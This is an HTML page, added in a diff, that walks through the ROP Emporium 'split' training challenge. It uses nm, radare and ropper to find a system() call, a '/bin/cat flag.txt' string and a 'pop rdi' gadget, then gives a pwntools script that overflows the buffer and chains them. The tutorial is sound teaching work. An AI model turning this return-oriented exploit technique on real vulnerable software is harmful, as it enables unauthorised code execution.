@@ -1,0 +1,120 @@
+<html>
+<head>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre>
+
+<h1>ROP Emporium Pt. 2: split</h1>
+<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
+before continuing</r>
+
+<a href="https://ropemporium.com">ROP Emporium</a> is a collection of challenges designed to teach return-oriented 
+programming (ROP) techniques by slowly introducing new concepts and increasing 
+difficulty. If you're looking for a spoiler-free guide, check out the one 
+included on their <a href="https://ropemporium.com/guide.html">website</a>.
+
+Split starts as the same type of challenge as ret2win but with one added element 
+of complexity. Now we have a couple of pieces to find and chain together to make 
+our exploit.
+
+We can see this when we search for symbols, finding the same pwnme function as 
+well as a usefulString (at 0x601060) and usefulFunction (at 0x400742).
+
+nm
+──────────────────────────────────────────
+  $ nm ./split | grep -e " t " -e " D "
+
+  0000000000601050 D __data_start
+  00000000004005f0 t deregister_tm_clones
+  0000000000400660 t __do_global_dtors_aux
+  0000000000601058 D __dso_handle
+  0000000000601072 D _edata
+  0000000000400690 t frame_dummy
+  00000000004006e8 t pwnme
+  0000000000400620 t register_tm_clones
+  0000000000601078 D __TMC_END__
+  0000000000400742 t usefulFunction
+  0000000000601060 D usefulString
+──────────────────────────────────────────
+
+The first piece is this function that calls system() which will allow us to 
+piece together and run a system command.
+
+radare
+─────────────────────────────────────────────────────────────────
+  [0x004006e8]> 0x400742
+  [0x00400742]> pdf
+  ┌ 17: sym.usefulFunction ();
+  │           0x00400742      55             push rbp
+  │           0x00400743      4889e5         mov rbp, rsp
+  │           0x00400746      bf4a084000     mov edi, str._bin_ls
+  │           0x0040074b      e810feffff     call sym.imp.system 
+  │           0x00400750      90             nop
+  │           0x00400751      5d             pop rbp
+  └           0x00400752      c3             ret
+─────────────────────────────────────────────────────────────────
+
+The second is exactly the command we want (/bin/cat flag.txt) which will read 
+the flag.
+
+radare
+─────────────────────────────────────────────────────────────────
+  [0x00400742]> 0x601060
+  [0x00601060]> pd
+              ;-- str._bin_cat_flag.txt:
+	      ;-- usefulString:
+              ;-- rip:
+              0x00601060     .string "/bin/cat flag.txt" ; len=18
+─────────────────────────────────────────────────────────────────
+
+Radare gives us the calling convention for this function 
+(int system(const char *command);) and with a little bit of research we can 
+figure out that works in Assembly.
+
+<a href="https://cs61.seas.harvard.edu/site/2018/Asm2/">cs61.seas.harvard.edu/site/2018/Asm2/</a>
+───────────────────────────────────────────────────────────────────
+  In x86-64 Linux, the first six function arguments are passed in 
+  registers %rdi, %rsi, %rdx, %rcx, %r8, and %r9, respectively.
+───────────────────────────────────────────────────────────────────
+
+We will need to find a gadget to set our %rdi register to our string.
+
+ropper                               
+─────────────────────────────────────
+  $ ropper -f ./split                
+  0x00000000004007c3: pop rdi; ret;  
+─────────────────────────────────────
+
+Basically, our exploit will need to do a couple of things; a buffer overflow to 
+pwnme(), pushing our usefulString to %rdi, and running our usefulFunction(). 
+
+In other words, it should look like 
+padding + pop rdi; ret; + usefulString + usefulFunction()
+
+Which we can put together with some python.
+
+exploit.py
+────────────────────────────────────────────────────────────────
+  from pwn import *
+  
+  p = process('./split') 
+  e = ELF('./split')
+  context(arch='amd64', os='linux', endian='little')
+  
+  payload = b'A' * 40
+  
+  payload += p64(0x004007c3) + p64(0x00601060) + p64(0x0040074b)
+  
+  print(payload)
+  
+  p.sendline(payload)
+  log.info(p.clean())
+────────────────────────────────────────────────────────────────
+
+See part 3 for more.
+
+// END //
+</pre>
+</body>
+</html>
